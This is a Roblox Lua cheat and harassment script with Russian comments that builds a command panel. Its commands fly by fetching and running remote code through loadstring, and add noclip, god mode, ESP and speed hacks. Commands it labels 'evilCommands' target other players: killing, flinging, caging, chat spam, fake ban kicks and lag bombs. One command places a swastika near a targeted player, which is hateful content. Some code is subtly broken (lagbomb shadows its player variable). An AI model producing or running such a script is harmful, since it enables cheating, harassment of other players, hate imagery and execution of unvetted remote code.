local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "UltimateCommandPanel"
ScreenGui.Parent = game:GetService("CoreGui")

-- Основная панель
local MainFrame = Instance.new("Frame")
MainFrame.Size = UDim2.new(0.25, 0, 0.06, 0)
MainFrame.Position = UDim2.new(0, 10, 0, 10)
MainFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
MainFrame.BackgroundTransparency = 0.2
MainFrame.Parent = ScreenGui

local CommandInput = Instance.new("TextBox")
CommandInput.Size = UDim2.new(0.7, 0, 1, 0)
CommandInput.Position = UDim2.new(0, 0, 0, 0)
CommandInput.PlaceholderText = "Type command (;cmd)"
CommandInput.BackgroundTransparency = 1
CommandInput.TextColor3 = Color3.new(1, 1, 1)
CommandInput.TextXAlignment = Enum.TextXAlignment.Left
CommandInput.Parent = MainFrame

local HelpButton = Instance.new("TextButton")
HelpButton.Size = UDim2.new(0.15, 0, 1, 0)
HelpButton.Position = UDim2.new(0.7, 0, 0, 0)
HelpButton.Text = "?"
HelpButton.BackgroundTransparency = 1
HelpButton.TextColor3 = Color3.new(1, 1, 1)
HelpButton.Parent = MainFrame

local ExecuteButton = Instance.new("TextButton")
ExecuteButton.Size = UDim2.new(0.15, 0, 1, 0)
ExecuteButton.Position = UDim2.new(0.85, 0, 0, 0)
ExecuteButton.Text = "▶"
ExecuteButton.BackgroundTransparency = 1
ExecuteButton.TextColor3 = Color3.new(0, 1, 0)
ExecuteButton.Parent = MainFrame

-- Командная система
local Commands = {
    -- Базовые команды
    fly = function() 
        loadstring(game:HttpGet("https://raw.githubusercontent.com/XNEOFF/FlyGui-V3/main/FlyGuiV3.lua"))() 
    end,
    
    noclip = function() 
        _G.noclip = true
        game:GetService("RunService").Stepped:Connect(function()
            if _G.noclip and game.Players.LocalPlayer.Character then
                for _, v in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
                    if v:IsA("BasePart") then 
                        v.CanCollide = false 
                    end
                end
            end
        end)
    end,
    
    clip = function() 
        _G.noclip = false
    end,
    
    god = function() 
        if game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid") then
            game.Players.LocalPlayer.Character.Humanoid.Health = math.huge 
        end
    end,
    
    esp = function() 
        for _, p in pairs(game.Players:GetPlayers()) do
            if p ~= game.Players.LocalPlayer and p.Character then
                local highlight = Instance.new("Highlight")
                highlight.FillTransparency = 0.5
                highlight.OutlineColor = Color3.new(1, 0, 0)
                highlight.Parent = p.Character
            end
        end
    end,
    
    speed = function(arg) 
        if game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid") then
            game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = tonumber(arg) or 50 
        end
    end,
    
    -- 🔥 Команды для троллинга игроков
    punish = function(arg)
        for _, p in pairs(game.Players:GetPlayers()) do
            if string.find(string.lower(p.Name), string.lower(arg)) and p.Character then
                p.Character.HumanoidRootPart.Anchored = true
                task.wait(1)
                p.Character.Humanoid.Health = 0
            end
        end
    end,

    orbit = function(arg)
        for _, p in pairs(game.Players:GetPlayers()) do
            if string.find(string.lower(p.Name), string.lower(arg)) and p.Character then
                local root = p.Character.HumanoidRootPart
                _G.orbitPlayers = _G.orbitPlayers or {}
                _G.orbitPlayers[p.Name] = true
                
                spawn(function()
                    while _G.orbitPlayers[p.Name] and root and root.Parent do
                        root.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * 
                                     CFrame.new(0, 0, -8) * 
                                     CFrame.Angles(0, math.rad(os.clock()*100), 0)
                        root.Velocity = Vector3.new(0,0,0)
                        task.wait(0.02)
                    end
                end)
            end
        end
    end,

    stoporbit = function(arg)
        _G.orbitPlayers = _G.orbitPlayers or {}
        if arg == "all" then
            for name in pairs(_G.orbitPlayers) do
                _G.orbitPlayers[name] = false
            end
        else
            for _, p in pairs(game.Players:GetPlayers()) do
                if string.find(string.lower(p.Name), string.lower(arg)) then
                    _G.orbitPlayers[p.Name] = false
                end
            end
        end
    end,

    firework = function(arg)
        for _, p in pairs(game.Players:GetPlayers()) do
            if string.find(string.lower(p.Name), string.lower(arg)) and p.Character then
                local root = p.Character.HumanoidRootPart
                spawn(function()
                    for i=1, 20 do
                        root.Velocity = Vector3.new(math.random(-50,50), math.random(100,200), math.random(-50,50))
                        task.wait(0.1)
                    end
                end)
            end
        end
    end,

    swastika = function(arg)
        for _, p in pairs(game.Players:GetPlayers()) do
            if string.find(string.lower(p.Name), string.lower(arg)) and p.Character then
                local pos = p.Character.HumanoidRootPart.Position
                local parts = {}
                
                -- Создаем свастику
                for x = -15, 15, 5 do
                    local part = Instance.new("Part")
                    part.Size = Vector3.new(3,1,3)
                    part.Material = Enum.Material.Neon
                    part.Color = Color3.new(1,0,0)
                    part.CFrame = CFrame.new(pos + Vector3.new(x,0,0))
                    part.Anchored = true
                    part.Parent = workspace
                    table.insert(parts, part)
                end
                
                for z = -15, 15, 5 do
                    local part = Instance.new("Part")
                    part.Size = Vector3.new(3,1,3)
                    part.Material = Enum.Material.Neon
                    part.Color = Color3.new(1,0,0)
                    part.CFrame = CFrame.new(pos + Vector3.new(0,0,z))
                    part.Anchored = true
                    part.Parent = workspace
                    table.insert(parts, part)
                end
                
                -- Удалим через 10 секунд
                task.wait(10)
                for _, part in ipairs(parts) do
                    part:Destroy()
                end
            end
        end
    end,

    lagbomb = function(arg)
        for _, p in pairs(game.Players:GetPlayers()) do
            if string.find(string.lower(p.Name), string.lower(arg)) and p.Character then
                spawn(function()
                    while p.Character do
                        for i=1, 30 do
                            local p = Instance.new("Part")
                            p.Size = Vector3.new(1,1,1)
                            p.Position = p.Character.HumanoidRootPart.Position
                            p.Velocity = Vector3.new(math.random(-50,50), math.random(10,50), math.random(-50,50))
                            p.Parent = workspace
                            game:GetService("Debris"):AddItem(p, 10)
                        end
                        task.wait(0.2)
                    end
                end)
            end
        end
    end,

    nuke = function(arg)
        local explosion = Instance.new("Explosion")
        explosion.Position = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
        explosion.BlastRadius = 1000
        explosion.BlastPressure = 1000000
        explosion.ExplosionType = Enum.ExplosionType.CratersAndDebris
        explosion.Parent = workspace
        
        for _, p in pairs(game.Players:GetPlayers()) do
            if p ~= game.Players.LocalPlayer and p.Character then
                p.Character.Humanoid.Health = 0
            end
        end
    end,

    gulag = function(arg)
        for _, p in pairs(game.Players:GetPlayers()) do
            if string.find(string.lower(p.Name), string.lower(arg)) and p.Character then
                local cage = Instance.new("Part")
                cage.Size = Vector3.new(10,20,10)
                cage.Transparency = 0.7
                cage.CFrame = p.Character.HumanoidRootPart.CFrame
                cage.Anchored = true
                cage.CanCollide = true
                cage.Parent = workspace
                
                p.Character.HumanoidRootPart.CFrame = cage.CFrame + Vector3.new(0,5,0)
            end
        end
    end,

    toilet = function(arg)
        for _, p in pairs(game.Players:GetPlayers()) do
            if string.find(string.lower(p.Name), string.lower(arg)) and p.Character then
                local toilet = Instance.new("Part")
                toilet.Size = Vector3.new(5,3,5)
                toilet.CFrame = p.Character.HumanoidRootPart.CFrame * CFrame.new(0,-3,0)
                toilet.Anchored = true
                toilet.Parent = workspace
                
                p.Character.HumanoidRootPart.CFrame = toilet.CFrame * CFrame.new(0,2,0)
                
                local flush = Instance.new("Sound")
                flush.SoundId = "rbxassetid://9116399631"
                flush.Parent = toilet
                flush:Play()
                
                -- Добавляем воду
                local water = Instance.new("Part")
                water.Size = Vector3.new(4,1,4)
                water.CFrame = toilet.CFrame * CFrame.new(0,0.5,0)
                water.Anchored = true
                water.Transparency = 0.7
                water.Color = Color3.new(0,0.5,1)
                water.Parent = workspace
            end
        end
    end,

    trollface = function(arg)
        for _, p in pairs(game.Players:GetPlayers()) do
            if string.find(string.lower(p.Name), string.lower(arg)) and p.Character and p.Character:FindFirstChild("Head") then
                local decal = Instance.new("Decal")
                decal.Texture = "rbxassetid://1282893"
                decal.Face = Enum.NormalId.Front
                decal.Parent = p.Character.Head
            end
        end
    end,

    spamcall = function(arg)
        for _, p in pairs(game.Players:GetPlayers()) do
            if string.find(string.lower(p.Name), string.lower(arg)) then
                spawn(function()
                    while true do
                        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/call "..p.Name, "All")
                        task.wait(0.1)
                    end
                end)
            end
        end
    end,

    demonize = function(arg)
        for _, p in pairs(game.Players:GetPlayers()) do
            if string.find(string.lower(p.Name), string.lower(arg)) and p.Character then
                for _, part in pairs(p.Character:GetDescendants()) do
                    if part:IsA("BasePart") then
                        part.Color = Color3.new(0,0,0)
                        part.Material = Enum.Material.Neon
                        local fire = Instance.new("Fire")
                        fire.Heat = 25
                        fire.Size = 10
                        fire.Parent = part
                    end
                end
            end
        end
    end,

    lagswitch = function()
        _G.lagEnabled = not _G.lagEnabled
        spawn(function()
            while _G.lagEnabled do
                game:GetService("NetworkClient"):SetOutgoingKBPSLimit(1)
                task.wait(0.5)
            end
            game:GetService("NetworkClient"):SetOutgoingKBPSLimit(9e9)
        end)
    end,

    banhammer = function(arg)
        for _, p in pairs(game.Players:GetPlayers()) do
            if string.find(string.lower(p.Name), string.lower(arg)) then
                local msg = "🚨 ВАС ЗАБАНИЛИ ПО ПРИЧИНЕ: "
                local reasons = {"ЧИТЕРСТВО", "ТОКСИЧНОСТЬ", "АФК", "ОСКОРБЛЕНИЕ МОДЕРАТОРОВ"}
                p:Kick(msg..reasons[math.random(1,#reasons)].."\n⏳ Срок: "..math.random(1,999).." дней")
            end
        end
    end,
    
    -- Команды управления
    closegui = function() ScreenGui:Destroy() end,
    
    help = function()
        local allCommands = {}
        for cmd in pairs(Commands) do
            table.insert(allCommands, cmd)
        end
        table.sort(allCommands)
        
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Доступные команды ("..#allCommands..")",
            Text = table.concat(allCommands, ", "),
            Duration = 15
        })
    end
}

-- Автодополнение
CommandInput:GetPropertyChangedSignal("Text"):Connect(function()
    local text = CommandInput.Text:lower()
    if text:sub(1,1) == ";" then
        local partial = text:sub(2)
        local evilCommands = {"punish", "orbit", "firework", "swastika", "lagbomb", "nuke", 
                             "gulag", "toilet", "trollface", "spamcall", "demonize", "banhammer"}
        
        for _, cmd in ipairs(evilCommands) do
            if cmd:sub(1, #partial) == partial then
                CommandInput.Text = ";"..cmd
                CommandInput.CursorPosition = #text + 1
                return
            end
        end
        
        for cmd in pairs(Commands) do
            if cmd:sub(1, #partial) == partial then
                CommandInput.Text = ";"..cmd
                CommandInput.CursorPosition = #text + 1
                break
            end
        end
    end
end)

-- Обработка команд
local function ExecuteCommand(cmdText)
    if cmdText:sub(1,1) == ";" then
        cmdText = cmdText:sub(2)
    end
    
    local command, args = cmdText:match("^(%S+)%s*(.*)$")
    command = command and command:lower() or ""
    
    if Commands[command] then
        pcall(Commands[command], args)
        return true
    end
    return false
end

-- Обработчики кнопок
ExecuteButton.MouseButton1Click:Connect(function()
    if not ExecuteCommand(CommandInput.Text) then
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Неизвестная команда",
            Text = "Введите ;help для списка команд",
            Duration = 2
        })
    end
    CommandInput.Text = ""
end)

HelpButton.MouseButton1Click:Connect(function()
    Commands.help()
end)

CommandInput.FocusLost:Connect(function(enterPressed)
    if enterPressed then
        ExecuteButton:Activate()
    end
end)

-- Перетаскивание
local dragging, dragInput, dragStart, startPos

local function update(input)
    local delta = input.Position - dragStart
    MainFrame.Position = UDim2.new(
        startPos.X.Scale, 
        startPos.X.Offset + delta.X,
        startPos.Y.Scale, 
        startPos.Y.Offset + delta.Y
    )
end

MainFrame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = true
        dragStart = input.Position
        startPos = MainFrame.Position
        
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)

MainFrame.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement then
        dragInput = input
    end
end)

game:GetService("UserInputService").InputChanged:Connect(function(input)
    if input == dragInput and dragging then
        update(input)
    end
end)

-- Инициализация
Commands.help()
